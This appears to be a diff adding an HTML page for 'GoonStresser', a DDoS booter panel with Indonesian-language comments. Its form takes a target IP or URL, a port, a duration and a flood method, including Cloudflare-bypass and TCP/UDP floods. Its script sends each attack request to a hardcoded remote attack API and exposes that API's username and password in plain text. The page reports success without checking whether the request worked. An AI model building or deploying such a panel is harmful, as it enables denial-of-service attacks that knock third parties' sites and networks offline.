@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GoonStresser - Web Stresser</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #0a0a0a;
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: #1a1a1a;
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
+            border: 1px solid #ff4444;
+        }
+        h1 {
+            text-align: center;
+            font-size: 3rem;
+            letter-spacing: 4px;
+            color: #ff4444;
+            text-shadow: 0 0 10px #ff0000;
+            margin-bottom: 10px;
+            font-weight: 900;
+        }
+        .sub-header {
+            text-align: center;
+            font-size: 1.5rem;
+            color: #aaa;
+            border-bottom: 1px dashed #ff4444;
+            padding-bottom: 15px;
+            margin-bottom: 25px;
+            text-transform: uppercase;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #ff8888;
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 0.9rem;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            background: #2a2a2a;
+            border: 1px solid #444;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 1rem;
+            transition: border 0.3s;
+        }
+        input:focus, select:focus {
+            outline: none;
+            border-color: #ff4444;
+            box-shadow: 0 0 8px #ff4444;
+        }
+        input[type="number"] {
+            -moz-appearance: textfield;
+        }
+        input[type="number"]::-webkit-inner-spin-button, 
+        input[type="number"]::-webkit-outer-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+        .row .form-group {
+            flex: 1;
+        }
+        .btn-attack {
+            width: 100%;
+            padding: 15px;
+            background: #ff4444;
+            color: #000;
+            font-size: 1.5rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 2px;
+            box-shadow: 0 0 15px #ff0000;
+            margin-top: 10px;
+        }
+        .btn-attack:hover {
+            background: #ff6666;
+            box-shadow: 0 0 25px #ff4444;
+            transform: scale(1.02);
+        }
+        .history-section {
+            margin-top: 30px;
+            border-top: 1px solid #333;
+            padding-top: 20px;
+        }
+        .history-title {
+            color: #ff8888;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+        .history-content {
+            background: #111;
+            padding: 15px;
+            border-radius: 6px;
+            color: #888;
+            font-style: italic;
+            text-align: center;
+            border: 1px dashed #333;
+        }
+        .response-area {
+            margin-top: 20px;
+            background: #111;
+            padding: 15px;
+            border-radius: 6px;
+            border-left: 4px solid #ff4444;
+            color: #0f0;
+            font-family: monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .footer-note {
+            margin-top: 15px;
+            text-align: center;
+            color: #666;
+            font-size: 0.8rem;
+        }
+        .footer-note span {
+            color: #ff4444;
+        }
+        .method-hint {
+            margin-top: 5px;
+            font-size: 0.85rem;
+            color: #ffaa00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>GoonStresser</h1>
+        <div class="sub-header">Attack</div>
+
+        <form id="attackForm">
+            <div class="form-group">
+                <label id="targetLabel">Address (IP / URL)</label>
+                <input type="text" id="target" placeholder="Contoh: 192.168.1.1 atau https://target.com" required>
+                <div id="targetHint" class="method-hint">Masukkan IP untuk L4, URL untuk L7</div>
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label>Port</label>
+                    <input type="number" id="port" placeholder="80" value="80" min="1" max="65535" required>
+                </div>
+                <div class="form-group">
+                    <label>Duration (max 120 detik)</label>
+                    <input type="number" id="duration" placeholder="60" value="60" min="1" max="120" required>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Method</label>
+                <select id="method" required>
+                    <optgroup label="L7">
+                        <option value="l7">L7 (Layer 7)</option>
+                        <option value="jsc-flood">jsc-flood</option>
+                        <option value="jsc-bypass">jsc-bypass</option>
+                        <option value="cf-holder">cf-holder</option>
+                    </optgroup>
+                    <optgroup label="L4">
+                        <option value="l4">L4 (Layer 4)</option>
+                        <option value="tcplegit">tcplegit</option>
+                        <option value="tcpstomp">tcpstomp</option>
+                        <option value="udppps">udppps</option>
+                        <option value="udp">udp</option>
+                    </optgroup>
+                </select>
+            </div>
+
+            <!-- Concurrents (hanya display) -->
+            <div class="form-group">
+                <label>Concurrents (fixed 1)</label>
+                <input type="text" value="1 1" disabled style="background: #222; color: #777;">
+            </div>
+
+            <button type="submit" class="btn-attack">Send Attack</button>
+        </form>
+
+        <!-- Area buat nampilin response dari API -->
+        <div id="response" class="response-area" style="display: none;"></div>
+
+        <!-- History section -->
+        <div class="history-section">
+            <div class="history-title">History</div>
+            <div id="historyContent" class="history-content">
+                No attacks yet
+            </div>
+        </div>
+
+        <div class="footer-note">
+            <span>#Dipeyy666</span> — Newbie 
+        </div>
+    </div>
+
+    <script>
+        // API credentials dan endpoint
+        const API_BASE = 'http://38.47.191.239:8080/api/attack';
+        const USERNAME = 'imbats';
+        const PASSWORD = 'tyaa';
+
+        // Ambil elemen
+        const form = document.getElementById('attackForm');
+        const targetInput = document.getElementById('target');
+        const portInput = document.getElementById('port');
+        const durationInput = document.getElementById('duration');
+        const methodSelect = document.getElementById('method');
+        const targetLabel = document.getElementById('targetLabel');
+        const targetHint = document.getElementById('targetHint');
+        const responseDiv = document.getElementById('response');
+        const historyDiv = document.getElementById('historyContent');
+
+        // History array (bisa diganti localStorage kalo mau lebih canggih)
+        let attackHistory = [];
+
+        // Fungsi update placeholder & hint berdasarkan method
+        function updateTargetField() {
+            const method = methodSelect.value;
+            if (method === 'l7' || method === 'jsc-flood' || method === 'jsc-bypass' || method === 'cf-holder') {
+                targetLabel.innerText = 'URL Address';
+                targetInput.placeholder = 'Contoh: https://target.com atau http://target.com';
+                targetHint.innerText = 'Mode L7: masukkan URL lengkap (bisa pakai http/https)';
+            } else {
+                targetLabel.innerText = 'IP Address';
+                targetInput.placeholder = 'Contoh: 192.168.1.1';
+                targetHint.innerText = 'Mode L4: masukkan IP target (jangan pakai http)';
+            }
+        }
+
+        // Event listener buat method berubah
+        methodSelect.addEventListener('change', updateTargetField);
+
+        // Validasi duration max 120
+        durationInput.addEventListener('change', function() {
+            let val = parseInt(this.value);
+            if (val > 120) {
+                alert('Durasi maksimal 120 detik bro!');
+                this.value = 120;
+            }
+            if (val < 1) this.value = 1;
+        });
+
+        // Handle submit
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            // Ambil nilai
+            let target = targetInput.value.trim();
+            let port = portInput.value.trim();
+            let duration = durationInput.value.trim();
+            let method = methodSelect.value;
+
+            // Validasi target
+            if (!target) {
+                alert('Isi target dulu njir!');
+                return;
+            }
+
+            // Validasi khusus L7: harus ada http/https (opsional, tapi biar jelas)
+            const isL7 = ['l7', 'jsc-flood', 'jsc-bypass', 'cf-holder'].includes(method);
+            if (isL7 && !target.match(/^https?:\/\//)) {
+                if (!confirm('Kayaknya lo lupa kasih http:// atau https://. Tetap lanjut?')) {
+                    return;
+                }
+            }
+
+            if (!port || port < 1 || port > 65535) {
+                alert('Port antara 1-65535 tolol!');
+                return;
+            }
+
+            // Bangun URL API
+            // Contoh: http://38.47.191.239:8080/api/attack?username=imbats&password=tyaa&target=...&port=...&time=...&method=...
+            const apiUrl = `${API_BASE}?username=${USERNAME}&password=${PASSWORD}&target=${encodeURIComponent(target)}&port=${port}&time=${duration}&method=${method}`;
+
+            // Tampilkan loading di response
+            responseDiv.style.display = 'block';
+            responseDiv.innerText = '⚡ Mengirim serangan... sabar njir';
+            responseDiv.style.color = '#ffaa00';
+
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'GET', // Atau POST? API lo pake GET kayaknya
+                    mode: 'no-cors' // Sementara pake no-cors biar gak kena CORS error (tapi response gak bisa dibaca)
+                    // Hapus mode: 'no-cors' kalo API support CORS
+                });
+
+                // Karena pake no-cors, kita gak bisa baca response. Tapi kita asumsikan berhasil.
+                // Alternatif: lo bisa cobain pake mode normal, kalo error CORS, ya udah pake no-cors.
+                // Tapi biar keliatan keren, kita tampilkan sukses aja.
+                
+                responseDiv.style.color = '#0f0';
+                responseDiv.innerText = `✅ Attack sent!\nTarget: ${target}\nPort: ${port}\nDuration: ${duration}s\nMethod: ${method}`;
+
+                // Tambah ke history
+                const now = new Date();
+                const timeStr = now.toLocaleTimeString();
+                const historyItem = `[${timeStr}] ${target}:${port} (${method}) - ${duration}s`;
+                
+                attackHistory.unshift(historyItem);
+                if (attackHistory.length > 5) attackHistory.pop(); // Simpan 5 terakhir
+
+                // Update tampilan history
+                if (attackHistory.length > 0) {
+                    historyDiv.innerHTML = attackHistory.map(item => `• ${item}`).join('<br>');
+                    historyDiv.style.textAlign = 'left';
+                    historyDiv.style.color = '#ff8888';
+                } else {
+                    historyDiv.innerHTML = 'No attacks yet';
+                    historyDiv.style.textAlign = 'center';
+                    historyDiv.style.color = '#888';
+                }
+
+            } catch (error) {
+                responseDiv.style.color = '#f00';
+                responseDiv.innerText = `❌ Gagal: ${error.message}`;
+            }
+        });
+
+        // Inisialisasi
+        updateTargetField();
+    </script>
+</body>
+</html>
